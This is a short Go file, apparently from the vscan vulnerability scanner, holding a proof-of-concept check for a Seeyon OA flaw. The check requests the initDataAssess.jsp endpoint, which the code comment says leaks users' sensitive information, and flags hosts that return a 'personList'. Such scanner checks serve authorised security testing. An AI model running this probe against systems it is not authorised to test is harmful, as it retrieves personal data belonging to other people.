package seeyon

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//initDataAssess.jsp 用户敏感信息泄露

func InitDataAssess(u string) bool {
	if req, err := pkg.HttpRequset(u+"/yyoa/assess/js/initDataAssess.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "personList") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon InitDataAssess|%s\n", u+"/yyoa/assess/js/initDataAssess.jsp"))

			return true
		}
	}
	return false
}
